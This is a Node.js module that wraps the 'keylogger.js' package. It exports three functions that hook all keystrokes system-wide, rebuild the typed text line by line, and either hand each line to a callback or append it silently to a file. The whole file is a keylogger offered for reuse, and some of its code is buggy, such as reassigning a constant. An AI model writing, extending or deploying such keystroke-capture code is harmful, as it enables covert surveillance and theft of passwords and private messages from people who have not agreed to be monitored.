const keylogger = require('keylogger.js');
const cmk = require("control-modifier-keys");
const fs = require('fs')


let word = []
let specialKeys = [38, 37, 40, 39, 164, 162, 165, 163, 9, 35, 34, 33, 36, 46, 27, 112, 91, 255, 173, 174, 175, 177, 179, 176, 44]
let shift = false

const keySanitization = (key, isKeyUp, keyCode) => {
    // Get the state of Caps lock
    const capsLockState = cmk.getModifierState("capslock");

    if (!isKeyUp && (keyCode == 160 || keyCode == 161)) {
        shift = true
    } else if (isKeyUp && (keyCode == 160 || keyCode == 161)) {
        shift = false
    } else if (isKeyUp && keyCode == 20) {
        capsLockState = !capsLockState
    } else if (isKeyUp && keyCode == 32) {
        key = ' '
        word.push(key)
    } else if (isKeyUp) {
        if (shift) {
            if (key == '`') key = '~'
            if (key == '1') key = '!'
            if (key == '2') key = '@'
            if (key == '3') key = '#'
            if (key == '4') key = '$'
            if (key == '5') key = '%'
            if (key == '6') key = '^'
            if (key == '7') key = '&'
            if (key == '8') key = '*'
            if (key == '9') key = '('
            if (key == '0') key = ')'
            if (key == '-') key = '_'
            if (key == '=') key = '+'
            if (key == '[') key = '{'
            if (key == ']') key = '}'
            if (key == '\\') key = '|'
            if (key == '/') key = '?'
            if (key == '/') key = '?'
            if (key == '.') key = '>'
            if (key == ',') key = '<'
        }
        if (capsLockState == false && !shift) {
            key = key.toLowerCase('/^[a-zA-Z]*$/')
        }
        word.push(key)
    }
    return word
}

const logEverything = (callback) => {
    keylogger.start((key, isKeyUp, keyCode) => {
        // Get the state of Caps lock
        const capsLockState = cmk.getModifierState("capslock");

        //console.log(event);
        if (!isKeyUp && (keyCode == 160 || keyCode == 161)) {
            shift = true
        } else if (isKeyUp && (keyCode == 160 || keyCode == 161)) {
            shift = false
        } else if (isKeyUp && keyCode == 20) {
            capsLockState = !capsLockState
        } else if (isKeyUp) {
            if (shift) {
                if (key == '`') key = '~'
                if (key == '1') key = '!'
                if (key == '2') key = '@'
                if (key == '3') key = '#'
                if (key == '4') key = '$'
                if (key == '5') key = '%'
                if (key == '6') key = '^'
                if (key == '7') key = '&'
                if (key == '8') key = '*'
                if (key == '9') key = '('
                if (key == '0') key = ')'
                if (key == '-') key = '_'
                if (key == '=') key = '+'
                if (key == '[') key = '{'
                if (key == ']') key = '}'
                if (key == '\\') key = '|'
                if (key == '/') key = '?'
                if (key == '/') key = '?'
                if (key == '.') key = '>'
                if (key == ',') key = '<'
            }
            if (capsLockState == false && !shift) {
                key = key.toLowerCase('/^[a-zA-Z]*$/')
            }
            //console.log({ key, keyCode, isKeyUp });
            callback({ key, keyCode, isKeyUp })
        }
    });
}

const logStatements = (callback) => {
    keylogger.start((key, isKeyUp, keyCode) => {
        // Get the state of Caps lock
        const capsLockState = cmk.getModifierState("capslock");

        //console.log(event);
        if (!isKeyUp && (keyCode == 160 || keyCode == 161)) {
            shift = true
        } else if (isKeyUp && (keyCode == 160 || keyCode == 161)) {
            shift = false
        } else if (isKeyUp && keyCode == 20) {
            capsLockState = !capsLockState
        } else if (isKeyUp && keyCode == 32) {
            key = ' '
            word.push(key)
        } else if (isKeyUp && keyCode == 8) {
            word.pop()
        } else if (isKeyUp && keyCode == 13) {
            key = '\n'
        } else if (isKeyUp && specialKeys.includes(keyCode)) {
            key = ''
        } else if (isKeyUp) {
            if (shift) {
                if (key == '`') key = '~'
                if (key == '1') key = '!'
                if (key == '2') key = '@'
                if (key == '3') key = '#'
                if (key == '4') key = '$'
                if (key == '5') key = '%'
                if (key == '6') key = '^'
                if (key == '7') key = '&'
                if (key == '8') key = '*'
                if (key == '9') key = '('
                if (key == '0') key = ')'
                if (key == '-') key = '_'
                if (key == '=') key = '+'
                if (key == '[') key = '{'
                if (key == ']') key = '}'
                if (key == '\\') key = '|'
                if (key == '/') key = '?'
                if (key == '/') key = '?'
                if (key == '.') key = '>'
                if (key == ',') key = '<'
            }
            if (capsLockState == false && !shift) {
                key = key.toLowerCase('/^[a-zA-Z]*$/')
            }
            word.push(key)
        }

        let withoutCommas = word.join('')
        if (keyCode === 13 && word.length != 0) {
            // console.log(`${withoutCommas}`);
            word = []
            callback(withoutCommas)
        }
    });
}

const logToFile = (fileName) => {
    keylogger.start((key, isKeyUp, keyCode) => {

        let _word = keySanitization(key, isKeyUp, keyCode)

        let withoutCommas = _word.join('')
        if (keyCode === 13) {
            word = []
            console.log(`${withoutCommas}`);
            fs.appendFileSync(fileName, withoutCommas)
        }
        //return withoutCommas
    });
}

module.exports = {
    logEverything,
    logStatements,
    logToFile
} 